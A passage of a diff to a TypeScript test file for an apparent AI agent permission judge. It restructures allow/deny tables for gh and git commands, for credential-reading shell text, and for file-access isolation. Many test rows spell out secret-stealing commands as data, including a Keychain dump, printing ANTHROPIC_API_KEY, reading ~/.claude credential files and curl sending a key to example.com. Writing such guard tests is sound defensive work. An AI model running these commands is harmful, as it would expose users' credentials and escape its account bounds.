+      { name: 'parsed: stdout discarded', command: 'ls src >/dev/null', decision: 'allow' },
+      {
+        name: 'parsed: wc then git status',
+        command: 'wc -l src/a.ts && git status',
+        decision: 'allow',
+      },
+      { name: 'parsed: a command split by quotes', command: "s'o'rt file", decision: 'allow' },
+      {
+        name: 'parsed: a double-quoted pattern',
+        command: 'grep -rn "foo bar" src',
+        decision: 'allow',
+      },
+    ]) {
+      expect.soft(ro('Bash', { command }).decision, `${name}: ${command}`).toBe(decision);
+    }
   });
 });
 
@@ -1941,337 +2033,352 @@ describe('delivery and gh', () => {
       protectedPaths: guarded(),
     }).decision;
 
-  it.each<{
-    name: string;
-    command: string;
-    local: 'allow' | 'deny';
-    pullRequest: 'allow' | 'deny';
-  }>([
-    {
-      name: 'push a feature branch',
-      command: 'git push origin feat/x',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'push -u HEAD',
-      command: 'git push -u origin HEAD',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'push behind git -C',
-      command: 'git -C . push origin feat/x',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'push inside sh -c',
-      command: "sh -c 'git push origin feat/x'",
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'read-only git',
-      command: 'git log --oneline -3',
-      local: 'allow',
-      pullRequest: 'allow',
-    },
-    { name: 'pr view', command: 'gh pr view 12', local: 'allow', pullRequest: 'allow' },
-    { name: 'pr list', command: 'gh pr list --state open', local: 'allow', pullRequest: 'allow' },
-    { name: 'pr checks', command: 'gh pr checks 12', local: 'allow', pullRequest: 'allow' },
-    { name: 'pr diff', command: 'gh pr diff 12', local: 'allow', pullRequest: 'allow' },
-    { name: 'pr status', command: 'gh pr status', local: 'allow', pullRequest: 'allow' },
-    {
-      name: 'pr create',
-      command: 'gh pr create --title x --body y',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    { name: 'pr merge', command: 'gh pr merge 12 --squash', local: 'deny', pullRequest: 'deny' },
-    { name: 'pr close', command: 'gh pr close 12', local: 'deny', pullRequest: 'deny' },
-    { name: 'pr edit', command: 'gh pr edit 12 --title x', local: 'deny', pullRequest: 'deny' },
-    { name: 'pr ready', command: 'gh pr ready 12', local: 'deny', pullRequest: 'deny' },
-    {
-      name: 'pr checkout, which switches the branch',
-      command: 'gh pr checkout 12',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    { name: 'pr review', command: 'gh pr review 12 --approve', local: 'deny', pullRequest: 'deny' },
-    {
-      name: 'pr create with -R first',
-      command: 'gh -R acme/widgets pr create',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'pr merge behind env',
-      command: 'env GH_TOKEN=x gh pr merge 12',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'pr merge by full path',
-      command: '/opt/homebrew/bin/gh pr merge 12',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'pr merge after cd',
-      command: 'cd src && gh pr merge 3',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'pr merge in sh -c',
-      command: "sh -c 'gh pr merge 3'",
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'api GET',
-      command: 'gh api repos/acme/widgets/pulls',
-      local: 'allow',
-      pullRequest: 'allow',
-    },
-    {
-      name: 'api explicit GET with fields',
-      command: 'gh api -X GET search/issues -f q=bug',
-      local: 'allow',
-      pullRequest: 'allow',
-    },
-    {
-      name: 'api -X POST',
-      command: 'gh api -X POST repos/acme/widgets/pulls',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'api --method=PATCH',
-      command: 'gh api --method=PATCH repos/acme/widgets',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'api -XDELETE',
-      command: 'gh api -XDELETE repos/acme/widgets/git/refs/heads/x',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'api with a field (an implicit POST)',
-      command: 'gh api repos/acme/widgets/issues -f title=x',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'api with a bundled field',
-      command: 'gh api repos/acme/widgets/issues -ftitle=x',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'api with --input',
-      command: 'gh api repos/acme/widgets/pulls --input body.json',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'api graphql',
-      command: "gh api graphql -f query='mutation { x }'",
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'repo view',
-      command: 'gh repo view --json nameWithOwner',
-      local: 'allow',
-      pullRequest: 'allow',
-    },
-    { name: 'repo list', command: 'gh repo list acme', local: 'allow', pullRequest: 'allow' },
-    {
-      name: 'repo edit',
-      command: 'gh repo edit --visibility public',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'repo delete',
-      command: 'gh repo delete acme/widgets --yes',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'repo create',
-      command: 'gh repo create acme/other',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    { name: 'repo sync', command: 'gh repo sync', local: 'deny', pullRequest: 'deny' },
-    {
-      name: 'repo set-default',
-      command: 'gh repo set-default acme/widgets',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    { name: 'issue list', command: 'gh issue list', local: 'allow', pullRequest: 'allow' },
-    { name: 'gh with no command', command: 'gh', local: 'allow', pullRequest: 'allow' },
-    { name: 'gh --version', command: 'gh --version', local: 'allow', pullRequest: 'allow' },
-    { name: 'help', command: 'gh help pr', local: 'allow', pullRequest: 'allow' },
-    { name: 'status', command: 'gh status', local: 'allow', pullRequest: 'allow' },
-    { name: 'auth status', command: 'gh auth status', local: 'allow', pullRequest: 'allow' },
-    {
-      name: 'auth status for one active host',
-      command: 'gh auth status --active --hostname github.com',
-      local: 'allow',
-      pullRequest: 'allow',
-    },
-    {
-      name: 'auth status --show-token, which prints the token',
-      command: 'gh auth status --show-token',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'auth status --show-token with a value',
-      command: 'gh auth status --show-token=true',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    { name: 'auth status -t', command: 'gh auth status -t', local: 'deny', pullRequest: 'deny' },
-    {
-      name: 'auth status with -t in a cluster of short flags',
-      command: 'gh auth status -at',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'auth status with -t after another flag',
-      command: 'gh auth status --hostname github.com -t',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'auth status with -t before the subcommand',
-      command: 'gh auth -t status',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'auth status with --show-token before the group',
-      command: 'gh --show-token auth status',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'auth status with -t first in a cluster',
-      command: 'gh auth status -ta',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      // gh reads this as --hostname t; refused anyway, since a cluster can't be told apart safely.
-      name: 'auth status with -t clustered after -h',
-      command: 'gh auth status -ht',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'auth status with -t after several flags',
-      command: 'gh auth status -a -h github.com -t',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'auth status as JSON with the token',
-      command: 'gh auth status --json hosts --show-token',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'auth status -t by full path',
-      command: '/opt/homebrew/bin/gh auth status -t',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'auth status -t behind env',
-      command: 'env GH_HOST=github.com gh auth status -t',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'auth status --show-token inside sh -c',
-      command: "sh -c 'gh auth status --show-token'",
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'auth status as JSON without the token',
-      command: 'gh auth status --json hosts',
-      local: 'allow',
-      pullRequest: 'allow',
-    },
-    { name: 'issue view', command: 'gh issue view 3', local: 'allow', pullRequest: 'allow' },
-    { name: 'search', command: 'gh search prs --author @me', local: 'allow', pullRequest: 'allow' },
-    { name: 'run list', command: 'gh run list --limit 5', local: 'allow', pullRequest: 'allow' },
-    { name: 'run view', command: 'gh run view 1', local: 'allow', pullRequest: 'allow' },
-    { name: 'workflow list', command: 'gh workflow list', local: 'allow', pullRequest: 'allow' },
-    {
-      name: 'workflow view',
-      command: 'gh workflow view ci.yml',
-      local: 'allow',
-      pullRequest: 'allow',
-    },
-    {
-      name: 'issue create',
-      command: 'gh issue create --title x --body y',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'an alias definition',
-      command: "gh alias set m 'pr merge'",
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    { name: 'an alias call', command: 'gh m 12', local: 'deny', pullRequest: 'deny' },
-    {
-      name: 'an extension install',
-      command: 'gh extension install owner/gh-x',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'the ext shorthand',
-      command: 'gh ext install owner/gh-x',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'auth token, which prints the token',
-      command: 'gh auth token',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'config set',
-      command: 'gh config set git_protocol ssh',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    {
-      name: 'workflow run',
-      command: 'gh workflow run deploy.yml',
-      local: 'deny',
-      pullRequest: 'deny',
-    },
-    { name: 'run rerun', command: 'gh run rerun 1', local: 'deny', pullRequest: 'deny' },
-    { name: 'run cancel', command: 'gh run cancel 1', local: 'deny', pullRequest: 'deny' },
-  ])('$name: $local in local, $pullRequest in pull_request', ({ command, local, pullRequest }) => {
-    expect(run(command, 'local')).toBe(local);
-    expect(run(command, 'pull_request')).toBe(pullRequest);
+  it('allows read-only gh and git, and denies a push, a write, a token print or an alias', () => {
+    const rows: {
+      name: string;
+      command: string;
+      local: 'allow' | 'deny';
+      pullRequest: 'allow' | 'deny';
+    }[] = [
+      {
+        name: 'push a feature branch',
+        command: 'git push origin feat/x',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'push -u HEAD',
+        command: 'git push -u origin HEAD',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'push behind git -C',
+        command: 'git -C . push origin feat/x',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'push inside sh -c',
+        command: "sh -c 'git push origin feat/x'",
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'read-only git',
+        command: 'git log --oneline -3',
+        local: 'allow',
+        pullRequest: 'allow',
+      },
+      { name: 'pr view', command: 'gh pr view 12', local: 'allow', pullRequest: 'allow' },
+      { name: 'pr list', command: 'gh pr list --state open', local: 'allow', pullRequest: 'allow' },
+      { name: 'pr checks', command: 'gh pr checks 12', local: 'allow', pullRequest: 'allow' },
+      { name: 'pr diff', command: 'gh pr diff 12', local: 'allow', pullRequest: 'allow' },
+      { name: 'pr status', command: 'gh pr status', local: 'allow', pullRequest: 'allow' },
+      {
+        name: 'pr create',
+        command: 'gh pr create --title x --body y',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      { name: 'pr merge', command: 'gh pr merge 12 --squash', local: 'deny', pullRequest: 'deny' },
+      { name: 'pr close', command: 'gh pr close 12', local: 'deny', pullRequest: 'deny' },
+      { name: 'pr edit', command: 'gh pr edit 12 --title x', local: 'deny', pullRequest: 'deny' },
+      { name: 'pr ready', command: 'gh pr ready 12', local: 'deny', pullRequest: 'deny' },
+      {
+        name: 'pr checkout, which switches the branch',
+        command: 'gh pr checkout 12',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'pr review',
+        command: 'gh pr review 12 --approve',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'pr create with -R first',
+        command: 'gh -R acme/widgets pr create',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'pr merge behind env',
+        command: 'env GH_TOKEN=x gh pr merge 12',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'pr merge by full path',
+        command: '/opt/homebrew/bin/gh pr merge 12',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'pr merge after cd',
+        command: 'cd src && gh pr merge 3',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'pr merge in sh -c',
+        command: "sh -c 'gh pr merge 3'",
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'api GET',
+        command: 'gh api repos/acme/widgets/pulls',
+        local: 'allow',
+        pullRequest: 'allow',
+      },
+      {
+        name: 'api explicit GET with fields',
+        command: 'gh api -X GET search/issues -f q=bug',
+        local: 'allow',
+        pullRequest: 'allow',
+      },
+      {
+        name: 'api -X POST',
+        command: 'gh api -X POST repos/acme/widgets/pulls',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'api --method=PATCH',
+        command: 'gh api --method=PATCH repos/acme/widgets',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'api -XDELETE',
+        command: 'gh api -XDELETE repos/acme/widgets/git/refs/heads/x',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'api with a field (an implicit POST)',
+        command: 'gh api repos/acme/widgets/issues -f title=x',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'api with a bundled field',
+        command: 'gh api repos/acme/widgets/issues -ftitle=x',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'api with --input',
+        command: 'gh api repos/acme/widgets/pulls --input body.json',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'api graphql',
+        command: "gh api graphql -f query='mutation { x }'",
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'repo view',
+        command: 'gh repo view --json nameWithOwner',
+        local: 'allow',
+        pullRequest: 'allow',
+      },
+      { name: 'repo list', command: 'gh repo list acme', local: 'allow', pullRequest: 'allow' },
+      {
+        name: 'repo edit',
+        command: 'gh repo edit --visibility public',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'repo delete',
+        command: 'gh repo delete acme/widgets --yes',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'repo create',
+        command: 'gh repo create acme/other',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      { name: 'repo sync', command: 'gh repo sync', local: 'deny', pullRequest: 'deny' },
+      {
+        name: 'repo set-default',
+        command: 'gh repo set-default acme/widgets',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      { name: 'issue list', command: 'gh issue list', local: 'allow', pullRequest: 'allow' },
+      { name: 'gh with no command', command: 'gh', local: 'allow', pullRequest: 'allow' },
+      { name: 'gh --version', command: 'gh --version', local: 'allow', pullRequest: 'allow' },
+      { name: 'help', command: 'gh help pr', local: 'allow', pullRequest: 'allow' },
+      { name: 'status', command: 'gh status', local: 'allow', pullRequest: 'allow' },
+      { name: 'auth status', command: 'gh auth status', local: 'allow', pullRequest: 'allow' },
+      {
+        name: 'auth status for one active host',
+        command: 'gh auth status --active --hostname github.com',
+        local: 'allow',
+        pullRequest: 'allow',
+      },
+      {
+        name: 'auth status --show-token, which prints the token',
+        command: 'gh auth status --show-token',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'auth status --show-token with a value',
+        command: 'gh auth status --show-token=true',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      { name: 'auth status -t', command: 'gh auth status -t', local: 'deny', pullRequest: 'deny' },
+      {
+        name: 'auth status with -t in a cluster of short flags',
+        command: 'gh auth status -at',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'auth status with -t after another flag',
+        command: 'gh auth status --hostname github.com -t',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'auth status with -t before the subcommand',
+        command: 'gh auth -t status',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'auth status with --show-token before the group',
+        command: 'gh --show-token auth status',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'auth status with -t first in a cluster',
+        command: 'gh auth status -ta',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        // gh reads this as --hostname t; refused anyway, since a cluster can't be told apart safely.
+        name: 'auth status with -t clustered after -h',
+        command: 'gh auth status -ht',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'auth status with -t after several flags',
+        command: 'gh auth status -a -h github.com -t',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'auth status as JSON with the token',
+        command: 'gh auth status --json hosts --show-token',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'auth status -t by full path',
+        command: '/opt/homebrew/bin/gh auth status -t',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'auth status -t behind env',
+        command: 'env GH_HOST=github.com gh auth status -t',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'auth status --show-token inside sh -c',
+        command: "sh -c 'gh auth status --show-token'",
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'auth status as JSON without the token',
+        command: 'gh auth status --json hosts',
+        local: 'allow',
+        pullRequest: 'allow',
+      },
+      { name: 'issue view', command: 'gh issue view 3', local: 'allow', pullRequest: 'allow' },
+      {
+        name: 'search',
+        command: 'gh search prs --author @me',
+        local: 'allow',
+        pullRequest: 'allow',
+      },
+      { name: 'run list', command: 'gh run list --limit 5', local: 'allow', pullRequest: 'allow' },
+      { name: 'run view', command: 'gh run view 1', local: 'allow', pullRequest: 'allow' },
+      { name: 'workflow list', command: 'gh workflow list', local: 'allow', pullRequest: 'allow' },
+      {
+        name: 'workflow view',
+        command: 'gh workflow view ci.yml',
+        local: 'allow',
+        pullRequest: 'allow',
+      },
+      {
+        name: 'issue create',
+        command: 'gh issue create --title x --body y',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'an alias definition',
+        command: "gh alias set m 'pr merge'",
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      { name: 'an alias call', command: 'gh m 12', local: 'deny', pullRequest: 'deny' },
+      {
+        name: 'an extension install',
+        command: 'gh extension install owner/gh-x',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'the ext shorthand',
+        command: 'gh ext install owner/gh-x',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'auth token, which prints the token',
+        command: 'gh auth token',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'config set',
+        command: 'gh config set git_protocol ssh',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      {
+        name: 'workflow run',
+        command: 'gh workflow run deploy.yml',
+        local: 'deny',
+        pullRequest: 'deny',
+      },
+      { name: 'run rerun', command: 'gh run rerun 1', local: 'deny', pullRequest: 'deny' },
+      { name: 'run cancel', command: 'gh run cancel 1', local: 'deny', pullRequest: 'deny' },
+    ];
+    for (const { name, command, local, pullRequest } of rows) {
+      expect.soft(run(command, 'local'), `${name} in local: ${command}`).toBe(local);
+      expect
+        .soft(run(command, 'pull_request'), `${name} in pull_request: ${command}`)
+        .toBe(pullRequest);
+    }
   });
 
   it('tells an agent that 10db pushes, whatever the delivery', () => {
@@ -2418,182 +2525,195 @@ describe('file access judge', () => {
       },
     },
   ];
-  for (const row of rows) {
-    it(row.name, () => {
+  it('refuses what the file-access judge refuses, and falls back to the repo bounds without one', () => {
+    for (const row of rows) {
       const verdict = withJudge(row.judge, row.tool, row.input);
       if (row.expected === 'allow') {
-        expect(verdict).toEqual({ decision: 'allow' });
+        expect.soft(verdict, row.name).toEqual({ decision: 'allow' });
       } else {
-        expect(verdict).toEqual({
+        expect.soft(verdict, row.name).toEqual({
           decision: 'deny',
           reason: row.expected.reason.replace('REPO', repo.path),
         });
       }
-    });
-  }
+    }
+  });
 });
 
 describe('credentials in shell text (the sandbox decides what a command can read)', () => {
-  it.each([
-    ['a Keychain read', 'security find-generic-password -s 10db -a account:acc_1 -w'],
-    ['a Keychain dump by full path', '/usr/bin/security dump-keychain'],
-    [
-      'AppleScript naming the Keychain',
-      `osascript -e 'tell application "Keychain Access" to quit'`,
-    ],
-    ['a bare env', 'env'],
-    ['printenv', 'printenv'],
-    ['printenv of one variable', 'printenv ANTHROPIC_API_KEY'],
-    ['a bare export', 'export'],
-    ['ps with the environment', 'ps eww'],
-    ['echo of an API key', 'echo $ANTHROPIC_API_KEY'],
-    ['a key sent in a header', 'curl -H "x-api-key: $ANTHROPIC_API_KEY" https://example.com'],
-    ['indirect expansion of a name', 'n=ANTHROPIC_API_KEY; echo ${!n}'],
-    ['a dump inside sh -c', "sh -c 'env'"],
-    ['node reading a credential', "node -p 'process.env.ANTHROPIC_API_KEY'"],
-    ['python reading the whole environment', "python3 -c 'import os;print(os.environ)'"],
-    ['the data directory', `cat "${data.path}/accounts/acc_1/claude/.claude.json"`],
-    ['the data directory through a repo link', 'cat link-data/accounts/acc_1/claude/.claude.json'],
-    ["Claude Code's default sign-in", 'cat ~/.claude/.credentials.json'],
-    ['the sign-in file through $HOME', 'cat "$HOME/.claude.json"'],
-    ['a glob over the default directory', 'ls -la ~/.claude*'],
-    ['cd home then a relative file', 'cd ~ && cat .claude.json'],
-    ['grep -r over the home directory', 'grep -r accessToken ~'],
-    ['find over home', 'find ~ -name .claude.json -exec cat {} +'],
-    ['tar of home', 'tar -cf - ~'],
-  ])('allows %s in an implement step', (_name, command) => {
-    expect(judge('Bash', { command })).toEqual({ decision: 'allow' });
-  });
-
-  it('allows the same text through Monitor', () => {
+  it('allows credential-shaped text in an implement step, through Bash and Monitor', () => {
+    const rows: [string, string][] = [
+      ['a Keychain read', 'security find-generic-password -s 10db -a account:acc_1 -w'],
+      ['a Keychain dump by full path', '/usr/bin/security dump-keychain'],
+      [
+        'AppleScript naming the Keychain',
+        `osascript -e 'tell application "Keychain Access" to quit'`,
+      ],
+      ['a bare env', 'env'],
+      ['printenv', 'printenv'],
+      ['printenv of one variable', 'printenv ANTHROPIC_API_KEY'],
+      ['a bare export', 'export'],
+      ['ps with the environment', 'ps eww'],
+      ['echo of an API key', 'echo $ANTHROPIC_API_KEY'],
+      ['a key sent in a header', 'curl -H "x-api-key: $ANTHROPIC_API_KEY" https://example.com'],
+      ['indirect expansion of a name', 'n=ANTHROPIC_API_KEY; echo ${!n}'],
+      ['a dump inside sh -c', "sh -c 'env'"],
+      ['node reading a credential', "node -p 'process.env.ANTHROPIC_API_KEY'"],
+      ['python reading the whole environment', "python3 -c 'import os;print(os.environ)'"],
+      ['the data directory', `cat "${data.path}/accounts/acc_1/claude/.claude.json"`],
+      [
+        'the data directory through a repo link',
+        'cat link-data/accounts/acc_1/claude/.claude.json',
+      ],
+      ["Claude Code's default sign-in", 'cat ~/.claude/.credentials.json'],
+      ['the sign-in file through $HOME', 'cat "$HOME/.claude.json"'],
+      ['a glob over the default directory', 'ls -la ~/.claude*'],
+      ['cd home then a relative file', 'cd ~ && cat .claude.json'],
+      ['grep -r over the home directory', 'grep -r accessToken ~'],
+      ['find over home', 'find ~ -name .claude.json -exec cat {} +'],
+      ['tar of home', 'tar -cf - ~'],
+    ];
+    for (const [name, command] of rows) {
+      expect.soft(judge('Bash', { command }), `${name}: ${command}`).toEqual({ decision: 'allow' });
+    }
     expect(judge('Monitor', { command: 'printenv' })).toEqual({ decision: 'allow' });
   });
 });
 
 describe('account isolation', () => {
   // Two rows resolve paths in the real home, which no sandbox can read.
-  it.skipIf(SANDBOXED).each<{ name: string; tool: string; input: () => Record<string, unknown> }>([
-    { name: 'Read', tool: 'Read', input: () => ({ file_path: join(CONFIG, '.claude.json') }) },
-    {
-      name: 'Read through a repo link',
-      tool: 'Read',
-      input: () => ({ file_path: 'link-data/accounts/acc_1/claude/.claude.json' }),
-    },
-    { name: 'Glob', tool: 'Glob', input: () => ({ pattern: '**/*', path: data.path }) },
-    { name: 'Grep', tool: 'Grep', input: () => ({ pattern: 'token', path: data.path }) },
-    {
-      name: 'Write',
-      tool: 'Write',
-      input: () => ({ file_path: join(CONFIG, 'settings.json'), content: '{}' }),
-    },
-    {
-      name: 'Read of the default sign-in file',
-      tool: 'Read',
-      input: () => ({ file_path: join(homedir(), '.claude.json') }),
-    },
-    {
-      name: 'Read of its backup',
-      tool: 'Read',
-      input: () => ({ file_path: join(homedir(), '.claude.json.backup') }),
-    },
-    {
-      name: "Read in the login shell's config directory",
-      tool: 'Read',
-      input: () => ({ file_path: join(login.path, '.claude.json') }),
-    },
-    {
-      name: "Read of another session's saved output",
-      tool: 'Read',
-      input: () => ({ file_path: join(OTHER_RESULTS, 'out.txt') }),
-    },
-    {
-      name: 'Grep over the home directory',
-      tool: 'Grep',
-      input: () => ({ pattern: 'x', path: homedir(), glob: '.claude.json*' }),
-    },
-    {
-      name: 'Glob over the home directory',
-      tool: 'Glob',
-      input: () => ({ pattern: '.claude.json*', path: homedir() }),
-    },
-    {
-      name: 'Glob with a glob in the data directory path',
-      tool: 'Glob',
-      input: () => ({
-        pattern: `${dirname(data.path)}/${basename(data.path).slice(0, 3)}*/**/.claude.json`,
-      }),
-    },
-    {
-      name: "Read of the session's saved output through a link out of it",
-      tool: 'Read',
-      input: () => ({ file_path: join(OWN_RESULTS, 'escape') }),
-    },
-    {
-      name: "Read of another session's output through ..",
-      tool: 'Read',
-      input: () => ({
-        file_path: join(OWN_RESULTS, '..', '..', 'sess_other', 'tool-results', 'out.txt'),
-      }),
-    },
-    {
-      name: 'Glob whose relative path and pattern reach the data directory through a link',
-      tool: 'Glob',
-      input: () => ({ pattern: '../link-data/**', path: 'src' }),
-    },
-    {
-      name: "Read of another task's pasted picture",
-      tool: 'Read',
-      input: () => ({ file_path: join(OTHER_FILES, 'shot.png') }),
-    },
-    {
-      name: "Read of another task's picture through .. from the task's own",
-      tool: 'Read',
-      input: () => ({ file_path: join(OWN_FILES, '..', '..', 'tsk_other', 'files', 'shot.png') }),
-    },
-    {
-      name: "Read of the task's pictures through a link out of them",
-      tool: 'Read',
-      input: () => ({ file_path: join(OWN_FILES, 'escape.png') }),
-    },
-    {
-      name: "Grep in the task's own pictures, which only Read opens",
-      tool: 'Grep',
-      input: () => ({ pattern: 'png', path: OWN_FILES }),
-    },
-  ])('denies $name on a protected path in both step kinds', ({ tool, input }) => {
-    for (const readOnly of [false, true]) {
-      const verdict = judge(tool, input(), [{ kind: 'area', name: 'api' }], readOnly);
-      expect(verdict.decision).toBe('deny');
-      expect(verdict.decision === 'deny' ? verdict.reason : '').toMatch(/data directory|sign-in/);
+  it.skipIf(SANDBOXED)('denies a protected path in both step kinds', () => {
+    const rows: { name: string; tool: string; input: () => Record<string, unknown> }[] = [
+      { name: 'Read', tool: 'Read', input: () => ({ file_path: join(CONFIG, '.claude.json') }) },
+      {
+        name: 'Read through a repo link',
+        tool: 'Read',
+        input: () => ({ file_path: 'link-data/accounts/acc_1/claude/.claude.json' }),
+      },
+      { name: 'Glob', tool: 'Glob', input: () => ({ pattern: '**/*', path: data.path }) },
+      { name: 'Grep', tool: 'Grep', input: () => ({ pattern: 'token', path: data.path }) },
+      {
+        name: 'Write',
+        tool: 'Write',
+        input: () => ({ file_path: join(CONFIG, 'settings.json'), content: '{}' }),
+      },
+      {
+        name: 'Read of the default sign-in file',
+        tool: 'Read',
+        input: () => ({ file_path: join(homedir(), '.claude.json') }),
+      },
+      {
+        name: 'Read of its backup',
+        tool: 'Read',
+        input: () => ({ file_path: join(homedir(), '.claude.json.backup') }),
+      },
+      {
+        name: "Read in the login shell's config directory",
+        tool: 'Read',
+        input: () => ({ file_path: join(login.path, '.claude.json') }),
+      },
+      {
+        name: "Read of another session's saved output",
+        tool: 'Read',
+        input: () => ({ file_path: join(OTHER_RESULTS, 'out.txt') }),
+      },
+      {
+        name: 'Grep over the home directory',
+        tool: 'Grep',
+        input: () => ({ pattern: 'x', path: homedir(), glob: '.claude.json*' }),
+      },
+      {
+        name: 'Glob over the home directory',
+        tool: 'Glob',
+        input: () => ({ pattern: '.claude.json*', path: homedir() }),
+      },
+      {
+        name: 'Glob with a glob in the data directory path',
+        tool: 'Glob',
+        input: () => ({
+          pattern: `${dirname(data.path)}/${basename(data.path).slice(0, 3)}*/**/.claude.json`,
+        }),
+      },
+      {
+        name: "Read of the session's saved output through a link out of it",
+        tool: 'Read',
+        input: () => ({ file_path: join(OWN_RESULTS, 'escape') }),
+      },
+      {
+        name: "Read of another session's output through ..",
+        tool: 'Read',
+        input: () => ({
+          file_path: join(OWN_RESULTS, '..', '..', 'sess_other', 'tool-results', 'out.txt'),
+        }),
+      },
+      {
+        name: 'Glob whose relative path and pattern reach the data directory through a link',
+        tool: 'Glob',
+        input: () => ({ pattern: '../link-data/**', path: 'src' }),
+      },
+      {
+        name: "Read of another task's pasted picture",
+        tool: 'Read',
+        input: () => ({ file_path: join(OTHER_FILES, 'shot.png') }),
+      },
+      {
+        name: "Read of another task's picture through .. from the task's own",
+        tool: 'Read',
+        input: () => ({ file_path: join(OWN_FILES, '..', '..', 'tsk_other', 'files', 'shot.png') }),
+      },
+      {
+        name: "Read of the task's pictures through a link out of them",
+        tool: 'Read',
+        input: () => ({ file_path: join(OWN_FILES, 'escape.png') }),
+      },
+      {
+        name: "Grep in the task's own pictures, which only Read opens",
+        tool: 'Grep',
